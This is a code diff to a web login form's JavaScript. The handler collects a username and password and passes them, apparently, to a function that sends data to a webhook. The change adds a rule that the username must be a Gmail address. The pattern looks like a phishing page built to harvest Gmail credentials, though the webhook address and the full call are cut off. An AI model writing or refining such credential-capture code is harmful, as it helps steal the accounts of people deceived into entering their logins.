@@ -19,13 +19,19 @@ function sendToWebhook(content) {
 document.getElementById("loginForm").addEventListener("submit", function (e) {
     e.preventDefault();
 
-    const username = document.getElementById("username").value.trim();
-    const password = document.getElementById("password").value.trim();
+const username = document.getElementById("username").value.trim();
+const password = document.getElementById("password").value.trim();
 
-    if (!username || !password) {
-        alert("Please fill in all fields.");
-        return;
-    }
+if (!username || !password) {
+    alert("Please fill in all fields.");
+    return;
+}
+
+// Require a Gmail address
+if (!username.toLowerCase().endsWith("@gmail.com")) {
+    alert("Please enter a valid Gmail address.");
+    return;
+}
 
 
     sendToWebhook(
